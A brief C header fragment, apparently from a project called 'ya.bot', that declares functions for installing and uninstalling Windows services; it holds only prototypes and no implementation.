/*  ya.bot  */

bool service_install(char *pszServiceName,
		char *pszServicePath,
		DWORD dwServiceType,
		DWORD dwServiceStartup,
		bool bStartService);
bool service_uninstall(char *pszServiceName);
